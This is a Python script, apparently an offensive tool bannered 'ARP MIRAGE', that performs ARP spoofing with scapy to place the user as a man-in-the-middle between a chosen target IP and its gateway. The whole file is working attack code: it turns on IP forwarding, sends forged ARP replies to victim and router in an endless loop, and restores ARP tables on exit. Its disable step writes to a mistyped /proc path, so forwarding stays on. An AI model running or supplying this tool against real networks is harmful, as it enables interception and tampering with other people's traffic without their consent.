#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import argparse
from colorama import Fore
import os

red = Fore.RED
green = Fore.LIGHTGREEN_EX
dgreen = Fore.GREEN
yellow = Fore.YELLOW

def get_banner():
    banner = """
       ▄▄▄       ██▀███   ██▓███      ███▄ ▄███▓ ██▓ ██▀███   ▄▄▄        ▄████ ▓█████ 
      ▒████▄    ▓██ ▒ ██▒▓██░  ██▒   ▓██▒▀█▀ ██▒▓██▒▓██ ▒ ██▒▒████▄     ██▒ ▀█▒▓█   ▀ 
      ▒██  ▀█▄  ▓██ ░▄█ ▒▓██░ ██▓▒   ▓██    ▓██░▒██▒▓██ ░▄█ ▒▒██  ▀█▄  ▒██░▄▄▄░▒███   
      ░██▄▄▄▄██ ▒██▀▀█▄  ▒██▄█▓▒ ▒   ▒██    ▒██ ░██░▒██▀▀█▄  ░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ 
       ▓█   ▓██▒░██▓ ▒██▒▒██▒ ░  ░   ▒██▒   ░██▒░██░░██▓ ▒██▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒
       ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒▓▒░ ░  ░   ░ ▒░   ░  ░░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░
        ▒   ▒▒ ░  ░▒ ░ ▒░░▒ ░        ░  ░      ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░
        ░   ▒     ░░   ░ ░░          ░      ░    ▒ ░  ░░   ░   ░   ▒   ░ ░   ░    ░   
            ░  ░   ░                        ░    ░     ░           ░  ░      ░    ░  ░
                                                                                      
    """
    print(dgreen + banner)

def get_arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument("-t", "--target-ip", dest="target_ip", help="IP address of the target", required=True)
    parse.add_argument("-g", "--gateway-ip", dest="gateway_ip", help="IP address of the router", required=True)
    parse.add_argument("-i", "--interface", dest="interface", help="Network interface to use", default="eth0")
    return parse.parse_args()

def enable_ip_forwarding():
    print(green + "[+] Enabling IP forwarding....")
    os.system("echo 1 >  /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print(red + "[-] Disabling IP forwarding....")
    os.system("echo 0 > /proc/sys/ipv4/ip_forward")

def get_mac(ip, interface):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=interface)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print(yellow + f"[!] Could not find MAC address for IP: {ip}")
        return None

def spoof(target_ip, spoof_ip, target_mac, interface):
    if target_mac is None:
        print(yellow + f"[!] Could not find target MAC address for {target_ip}. Skipping.")
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, iface=interface, verbose=False)
    print(f"[+] Sent spoofed packet to {target_ip} (pretending to be {spoof_ip})")

def restore(destination_ip, source_ip, interface):
    destination_mac = get_mac(destination_ip, interface)
    source_mac = get_mac(source_ip, interface)
    if destination_mac is None or source_mac is None:
        print(f"[!] Could not find MAC address for {destination_ip} or {source_ip}. Skipping restore.")
        return
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, iface=interface, verbose=False)
    print(f"[+] Restored ARP table for {destination_ip}")

get_banner()
args = get_arguments()
target_ip = args.target_ip
gateway_ip = args.gateway_ip
interface = args.interface

if target_ip and gateway_ip:
    enable_ip_forwarding()
    try:
        print(green + "[+] Started spoofing...")
        target_mac = get_mac(target_ip, interface)
        gateway_mac = get_mac(gateway_ip, interface)
        if target_mac is None or gateway_mac is None:
            
            print(red + "[-] Could not find all necessary MAC addresses. Exiting...")
            sys.exit(1)
        packet_sent = 0
        while True:
            spoof(target_ip, gateway_ip, target_mac, interface)  # Spoof victim
            spoof(gateway_ip, target_ip, gateway_mac, interface)  # Spoof router
            packet_sent += 2
            print("\r[+] Packets sent: " + str(packet_sent), end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print(red + "\n[-] Quitting using Ctrl+C. Resetting ARP tables, please wait...")
        restore(gateway_ip, target_ip, interface)
        restore(target_ip, gateway_ip, interface)
        disable_ip_forwarding()
        print(green + "[+] ARP tables restored.")
else:
    print(red + "[-] Please specify both target IP and gateway IP using -t and -g options.")
